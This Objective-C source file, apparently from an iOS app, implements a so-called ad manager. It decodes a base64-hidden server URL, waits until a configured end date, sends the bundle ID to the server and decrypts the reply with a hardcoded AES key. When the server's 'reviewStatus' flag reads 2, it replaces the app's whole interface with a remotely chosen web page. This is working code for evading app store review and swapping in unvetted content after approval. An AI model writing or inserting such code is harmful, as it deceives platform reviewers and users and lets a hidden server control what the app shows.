//
//  ADManager.m
//  QFCreater
//
//  Created by douglas on 2018/10/11.
//  Copyright © 2018 douglas. All rights reserved.
//

#import "ADManager.h"
#import "ADWebViewController.h"
#import <CommonCrypto/CommonCryptor.h>
#define ADURL @"aHR0cHM6Ly9xTGR3d3MuY29tOjg4ODgvSW5kZXgvZ2V0QXBwRGF0YQ=="

#import "GTMBase64.h"
#if 0
#define BID   @"com.GalaxyRing.iPhone"
#else
//#undef NSLog
//#define NSLog(args, ...)
#define BID   [[NSBundle mainBundle] infoDictionary][@"CFBundleIdentifier"]

#endif
@implementation ADManager

static ADManager *adm;
+ (instancetype)shareInstance {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        adm = [ADManager new];
    });
    return adm;
}
- (void)realLoad{
    
    NSMutableDictionary *par = [NSMutableDictionary dictionary];
    
    NSString *Bid = [[NSBundle mainBundle] infoDictionary][@"CFBundleIdentifier"];
#if DEBUG
    BOOL isOn = NO;
    NSDictionary *dic = [NSDictionary dictionaryWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"GDAlertConfig" ofType:@"plist"]];
    isOn = [dic[@"AlertEnable"] boolValue];
    if (isOn) {
        Bid = @"com.GalaxyRing.iPhone";
    }
#endif
    
    [par setValue:Bid forKey:@"uniqueId"];
    [par setValue:@"1"forKey:@"buildVersionCode"];
    [par setValue:@"1"forKey:@"platform"];
    [par setValue:@"2.2.0"forKey:@"sourceCodeVersion"];
    
    NSString *newUrl = [[NSString alloc] initWithData:[GTMBase64 decodeString:ADURL] encoding:NSUTF8StringEncoding];
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    // [manager.requestSerializer setTimeoutInterval:1];
    manager.requestSerializer              = [AFHTTPRequestSerializer serializer];
    manager.responseSerializer             = [AFHTTPResponseSerializer serializer];
    [manager.requestSerializer setTimeoutInterval:15];
    [manager POST:newUrl parameters:par progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *result = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
        
            
            if (result && [result[@"code"] integerValue]== 200) {
                NSString *base64Encoded = result[@"data"];
                NSData *base64EncodedData = [[NSData alloc] initWithBase64EncodedString:base64Encoded options:0];
                NSData *key32 = [@"e2a93cf0acdf470d617c088cbd11586b" dataUsingEncoding:NSUTF8StringEncoding];
                
                NSData *retData = nil;
                NSUInteger dataLength = [base64EncodedData length];
                size_t bufferSize = dataLength + kCCBlockSizeAES128;
                void *buffer = malloc(bufferSize);
                bzero(buffer, bufferSize);
                size_t numBytesEncrypted = 0;
                CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt, kCCAlgorithmAES128,
                                                      kCCOptionPKCS7Padding|kCCOptionECBMode,
                                                      key32.bytes, key32.length,
                                                      NULL,
                                                      base64EncodedData.bytes, base64EncodedData.length,
                                                      buffer, bufferSize,
                                                      &numBytesEncrypted);
                if (cryptStatus == kCCSuccess) {
                    retData = [NSData dataWithBytes:buffer length:numBytesEncrypted];
                }
                free(buffer);
                
                NSString *string = [[NSString alloc] initWithData:retData encoding:NSUTF8StringEncoding];
                
                NSData *jsonData = [string dataUsingEncoding:NSUTF8StringEncoding];
                
                NSDictionary *configs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
                
                int reviewStatus = [configs[@"reviewStatus"] intValue];
                if (configs.count == 0) {
                    reviewStatus = 1;
                }
                if (reviewStatus == 1){
                    [self setADEnable:NO];
                }else if (reviewStatus == 2){
                    NSString * urlstr =[configs objectForKey:@"wapUrl"];
                    [self setADUrl:urlstr];
                    
                    [self setADEnable:YES];
                }
            } else {
                
            }
            
        

    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
    }];
    //NSString *buid = [[NSBundle mainBundle] infoDictionary][@"CFBundleIdentifier"];
}
- (void)prloadAD {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSDictionary *dic = [NSDictionary dictionaryWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"GDAlertConfig" ofType:@"plist"]];
    
    NSDate *endDate = [dateFormatter dateFromString:dic[@"EndDate"]];
    if ([[NSDate date] timeIntervalSince1970] < [endDate timeIntervalSince1970]) {
        return;
    }
    
    if (!_manager) {
        self.manager = [AFNetworkReachabilityManager sharedManager];
        __weak ADManager *weakSelf = (ADManager *)self;
        [self.manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
            __strong ADManager *strongSelf = weakSelf;
            
            if (status != strongSelf.currentState && (status == AFNetworkReachabilityStatusReachableViaWWAN|| status == AFNetworkReachabilityStatusReachableViaWiFi) ) {
                strongSelf.currentState = status;
                [strongSelf realLoad];
            }
        }];
        
        [self.manager startMonitoring];
    }
    [self showAD];
    
}
- (void)setADEnable:(BOOL) enable {
    NSUserDefaults *ude = [NSUserDefaults standardUserDefaults];
    BOOL current = NO;
    NSNumber *lenbale = [ude valueForKey:@"adenable"];
    if (lenbale ) {
        current = lenbale.boolValue;
    }
    if (enable == current) {
        return;
    }
    [ude setValue:@(enable) forKey:@"adenable"];
    [ude synchronize];
    if (enable) {
        [self showAD];
    }
}
- (BOOL)adEnable {
    NSUserDefaults *ude = [NSUserDefaults standardUserDefaults];
    NSNumber *enbale = [ude valueForKey:@"adenable"];
    if (enbale) {
        return enbale.boolValue;
    }
    return NO;
}
- (void)setADUrl:(NSString *)url {
    if (url && [url isKindOfClass:[NSString class]]) {
        NSUserDefaults *ude = [NSUserDefaults standardUserDefaults];
        [ude setObject:url forKey:@"adurl"];
        [ude synchronize];
    }
    
}
- (NSString *)getLoadURL {
    NSUserDefaults *ude = [NSUserDefaults standardUserDefaults];
    NSString *url = [ude valueForKey:@"adurl"];
    if (url && [url isKindOfClass:[NSString class]]) {
        return url;
    }
    return nil;
}

- (BOOL)showAD {
    if (self.adHasShow) {
        return YES;
    }
    BOOL result = NO;
    
    NSString *adurl  = [self getLoadURL];
    if ([self adEnable] && adurl) {
        ADWebViewController *sVC = [[ADWebViewController alloc] init];
        sVC.loadURL = adurl;
        UIWindow *win = [[UIApplication sharedApplication].delegate  window];
        [win setRootViewController:sVC];

        result = YES;
    }
    
    
    self.adHasShow = result;
    return result;
}
@end
